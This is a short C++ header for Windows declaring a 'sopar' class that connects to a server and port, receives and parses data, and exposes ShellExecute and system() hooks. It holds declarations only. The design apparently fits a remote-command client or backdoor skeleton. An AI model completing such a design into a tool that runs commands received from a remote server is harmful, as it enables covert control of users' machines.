#ifndef SOPAR_H_INCLUDED
#define SOPAR_H_INCLUDED

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

#include <cstdint>

#include "../stuff/str.h"

class sopar {
public:
    sopar(const char *server, const char *port);
    void go();
protected:
private:
    char buf[4096];
    SOCKET sock;
    char *sopar_recv();
    void sopar_send(const char *);
    void parse();
    void cleanup();
};

void ShellExecute(const char *what);

// c stdlib functions (we link to msvcrt.dll)

extern "C" void sprintf(char *buf, const char *fmt, ...);
extern "C" int system(const char *command);

#endif//SOPAR_H_INCLUDED
